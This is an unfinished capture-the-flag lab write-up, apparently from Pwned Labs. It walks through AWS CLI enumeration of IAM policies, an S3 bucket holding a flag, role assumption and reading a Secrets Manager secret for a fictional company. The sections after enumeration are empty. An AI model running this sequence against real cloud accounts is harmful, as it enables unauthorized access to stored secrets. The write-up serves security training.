# Intro to AWS IAM Enumeration

## Objective(s):
- Evaluate IAM security posture of Huge Logistics.
- Obtain the flag as proof of exfiltration.

## Skills/Concepts Covered
- IAM Enumeration
- S3 Bucket Enumeration

## Tools Used
- AWS CLI

## Enumeration
An Access Key ID as well as a Secret Access Key were provided for enumeration of Huge Logistics infrastructure. The provided credentials were used for authentication in the AWS CLI using the the following command:
Note: AWS Access Keys and Secret Access Keys are used to authenticate your requests to the AWS CLI and they are generated for a user in the IAM service in the AWS Console.
```bash
aws configure
```
<br>
<br>

The keys were set when prompted and the validity of the credentials were tested with the AWS equivalent of the whoami command for Linux:
```bash
aws sts get-caller-identity
```
<br>
<br>

From the above command the authenticated username for the AWS CLI was found. Further enumeration on the IAM user was conducted:
```bash
aws iam get-user-policies --user-name <user>
```
<br>
<br>
  
It was then discovered the user has a policy related to s3 attached to them. Further info on the policy was then obtained:
```bash
aws iam get-user-policy --user-name <username> --policy-name <policy_name>
```
<br>
<br>
  
ListBucket and GetObject permissions were then discovered on for a s3 bucket in the account. With the permissions discovered and the bucket name obtained, the contents of the s3 bucket was listed out:
```bash
aws s3 ls s3://<s3_bucket>
```
<br>
<br>
  
The bucket contained the flag text file so that file was copied locally:
```bash
aws s3 cp s3://<s3_bucket>/<flag>
```
<br>
<br>

Further enumeration was conducted:
```bash
aws iam list-attached-user-policies --user-name <username>
```
<br>
<br>

Enumerated the found attached user policies further by obtaining the different policy versions for the policy:
```bash
aws iam list-policy-versions --policy-arn <policy_arn>
```
<br>
<br>

After the policy versions were obtained further enumeration was conducted on the specific policy versions:
```bash
aws iam get-policy-version --policy-arn <policy_arn> --version-id <version>
```
<br>
<br>

Roles discovered enumnerated as well:
```bash
aws iam list-attached-role-policies --role-name <role_name>
```
<br>
<br>

The role policy was enumerated:
```bash
aws iam list-policy-versions --policy-arn <policy_arn>
```
<br>
<br>

The policy version details of the policy attached to the role were obtained:
```
aws iam get-policy-version --policy-arn <policy_arn> --version-id <version>
```
<br>
<br>

The role details of the found role was investigated:
```bash
aws iam get-role --role-name <role_name>
```
<br>
<br>

The user we currently have access to can assume the role found. the role was assumed for further enumeration:
```bash
aws sts assume-role --role-arn <role_arn> --role-session-name <session_name>
```
<br>
<br>

The credentials obtained from assuming the role was configured:
```bash
aws configure
```
<br>
<br>

It was shown from prior enumeration that this role can list secrets:
```bash
aws secretsmanager list-secrets
```
<br>
<br>

The found secret was obtained:
```bash
aws secretsmanager get-secret-value --secret-id <secret_id>
```
<br>
<br>

Credentials and info for a database was obtained. Attempted to access the database:


## Exploitation


## Privilege escalation


## Detection opportunities


## Mitigations


## Learning Outcomes


## Lessons Learned


## Reference(s)
- https://pwnedlabs.io/









